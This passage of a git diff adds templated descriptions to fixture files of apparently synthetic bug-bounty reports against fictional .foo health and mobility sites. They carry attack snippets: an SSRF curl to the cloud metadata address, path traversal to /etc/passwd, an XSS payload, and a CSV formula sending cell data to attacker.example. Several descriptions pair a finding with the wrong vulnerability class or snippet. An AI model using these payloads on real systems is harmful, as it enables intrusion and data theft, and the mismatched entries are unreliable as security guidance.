+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://pay.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19736,7 +19889,8 @@
           "offset": "2d 23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://pay.schneeconnect-mobility.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19843,7 +19997,8 @@
           "offset": "2d 2h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19934,7 +20089,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://pay.schneeconnect-mobility.foo/export`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20081,7 +20237,8 @@
           "offset": "2d 18h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://app.schneeconnect-mobility.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20228,7 +20385,8 @@
           "offset": "4d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://app.schneeconnect-mobility.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20364,7 +20522,8 @@
           "offset": "7d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://app.schneeconnect-mobility.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20484,7 +20643,8 @@
           "offset": "6d 22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/seefjord_health_reports.json b/fixtures/reports/seefjord_health_reports.json
index 3d8748f..19a31ce 100644
--- a/fixtures/reports/seefjord_health_reports.json
+++ b/fixtures/reports/seefjord_health_reports.json
@@ -74,7 +74,8 @@
           "offset": "7d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "StudyDescription value is injected into innerHTML without encoding in patient portal viewer, enabling stored XSS.\n\n### Technical analysis\n- Vulnerability class: **Stored/Reflected XSS**\n- Affected target: `https://portal.seefjord-health.foo/viewer`\n- Preconditions: authenticated user: patient; app version: Viewer 2.8\n\n```javascript\n// Sanitize and HTML-encode untrusted data before DOM insertion\nconst unsafe = req.body.subject;\n// BAD\ndocument.querySelector('#subject').innerHTML = unsafe;\n// GOOD\ndocument.querySelector('#subject').textContent = unsafe;\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Upload study with StudyDescription '<svg onload=alert(1)>'\n- Open viewer; payload executes in list and header\n\n### Recommendations\n- HTML-encode untrusted data before DOM insertion.\n- Prefer `textContent`/safe templating.\n- Deploy strict CSP; strip dangerous tags/attributes.\n"
     },
     "triager": {
       "status": "accepted",
@@ -227,7 +228,8 @@
           "offset": "6d 11h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.seefjord-health.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -355,7 +357,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.seefjord-health.foo/import`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -499,7 +502,8 @@
           "offset": "6d 13h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.seefjord-health.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -589,7 +593,8 @@
           "offset": "3d 14h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -700,7 +705,8 @@
           "offset": "2d 20h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.seefjord-health.foo/export`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -814,7 +820,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -974,7 +981,8 @@
           "offset": "7d 14h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.seefjord-health.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1097,7 +1105,8 @@
           "offset": "4d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.seefjord-health.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1232,7 +1241,8 @@
           "offset": "4d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.seefjord-health.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1392,7 +1402,8 @@
           "offset": "6d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.seefjord-health.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1543,7 +1554,8 @@
           "offset": "3d 18h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.seefjord-health.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1691,7 +1703,8 @@
           "offset": "3d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.seefjord-health.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1798,7 +1811,8 @@
           "offset": "3d 21h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.seefjord-health.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1913,7 +1927,8 @@
           "offset": "9d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.seefjord-health.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2057,7 +2072,8 @@
           "offset": "6d 19h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.seefjord-health.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2185,7 +2201,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.seefjord-health.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2312,7 +2329,8 @@
           "offset": "4d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.seefjord-health.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2444,7 +2462,8 @@
           "offset": "7d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.seefjord-health.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2598,7 +2617,8 @@
           "offset": "5d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2701,7 +2721,8 @@
           "offset": "5d 17h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.seefjord-health.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2860,7 +2881,8 @@
           "offset": "8d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.seefjord-health.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3012,7 +3034,8 @@
           "offset": "2d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.seefjord-health.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3143,7 +3166,8 @@
